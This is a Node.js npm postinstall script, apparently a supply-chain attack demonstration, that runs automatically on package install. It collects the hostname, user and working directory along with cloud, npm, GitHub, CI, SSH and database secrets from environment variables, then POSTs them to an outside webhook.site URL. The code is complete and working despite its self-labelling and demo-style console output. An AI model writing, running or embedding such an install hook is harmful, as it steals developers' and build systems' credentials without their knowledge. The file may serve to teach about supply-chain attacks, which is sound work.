#!/usr/bin/env node

// MALICIOUS POSTINSTALL SCRIPT
// This runs automatically during 'npm install'

console.log("\n🚨 MALICIOUS POSTINSTALL SCRIPT EXECUTING 🚨\n");

const https = require("https");
const http = require("http");

// Collect all environment variables (secrets!)
const secrets = {
  timestamp: new Date().toISOString(),
  hostname: process.env.HOSTNAME || "unknown",
  user: process.env.USER || process.env.USERNAME || "unknown",
  pwd: process.cwd(),
  env: {},
};

// Grab interesting environment variables
const interestingKeys = [
  "AWS_ACCESS_KEY_ID",
  "AWS_SECRET_ACCESS_KEY",
  "AWS_SESSION_TOKEN",
  "NPM_TOKEN",
  "GITHUB_TOKEN",
  "ACTIONS_RUNTIME_TOKEN",
  "EC2_SSH_KEY",
  "DATABASE_URL",
  "API_KEY",
];

for (const key of interestingKeys) {
  if (process.env[key]) {
    secrets.env[key] = process.env[key];
  }
}

console.log("📦 Package installed in:", secrets.pwd);
console.log("👤 User:", secrets.user);
console.log("🔑 Found secrets:", Object.keys(secrets.env));

// Exfiltrate to attacker's webhook
const payload = JSON.stringify(secrets, null, 2);

console.log("\n📤 Exfiltrating data to attacker server...\n");
console.log(payload);

const url = "https://webhook.site/0270850a-1e21-43a6-8fbc-419eceaa8b36";

https
  .request(
    url,
    {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": payload.length,
      },
    },
    (res) => {
      console.log(`\n✅ Exfiltration complete! Status: ${res.statusCode}`);
    }
  )
  .on("error", (err) => {
    console.error("❌ Exfiltration failed:", err.message);
  })
  .end(payload);

console.log("\n🎯 Attack successful! Secrets have been stolen.\n");
